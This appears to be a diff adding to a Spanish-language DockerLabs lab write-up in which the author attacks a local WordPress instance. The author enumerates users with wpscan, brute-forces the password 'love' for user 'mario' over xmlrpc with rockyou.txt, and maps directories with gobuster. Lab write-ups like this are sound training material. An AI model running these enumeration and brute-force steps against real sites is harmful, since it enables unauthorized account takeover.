@@ -89,5 +89,72 @@ Finished
 ===============================================================
 ```
 Ya vemos con el fuzzing que se trata de un wordpress, vamos a ver la página web y enumeramos con **wpscan**.
+
 ![wordpress](https://github.com/TBrux/DOCKERLABS/assets/168732212/46ea7c22-9d71-45cf-a4ec-5278d3473d36)
+
+```bash
+wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp
+```
+```
+[+] mario
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+```
+Encontramos el usuario **mario** y con ese usuario y con **wpscan** trataremos de hacer fuerza bruta a ver si podemos conseguir la contraseña.
+```bash
+wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
+```
+```
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - mario / love                                                                                                                                                                                                                   
+Trying mario / badboy Time: 00:00:02 <                                                                                                                                                             > (390 / 14344782)  0.00%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: mario, Password: love
+```
+Hemos encontrado la contraseña **love**, así que ahora comprobamos si tenemos acceso al panel de login para acceder con mario:love 
+```bash
+❯ gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html
+```
+```
+❯ gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2/wordpress/
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/wordpress/]
+/wp-content           (Status: 301) [Size: 323] [--> http://172.17.0.2/wordpress/wp-content/]
+/wp-login.php         (Status: 200) [Size: 6580]
+/license.txt          (Status: 200) [Size: 19915]
+/wp-includes          (Status: 301) [Size: 324] [--> http://172.17.0.2/wordpress/wp-includes/]
+/readme.html          (Status: 200) [Size: 7401]
+/wp-trackback.php     (Status: 200) [Size: 136]
+/wp-admin             (Status: 301) [Size: 321] [--> http://172.17.0.2/wordpress/wp-admin/]
+/xmlrpc.php           (Status: 405) [Size: 42]
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/wp-signup.php        (Status: 302) [Size: 0] [--> http://172.17.0.2/wordpress/wp-login.php?action=register]
+Progress: 882240 / 882244 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+Vemos que tenemos acceso al panel de **/wp-admin** y que con las credenciales obtenidas tenemos acceso.
 
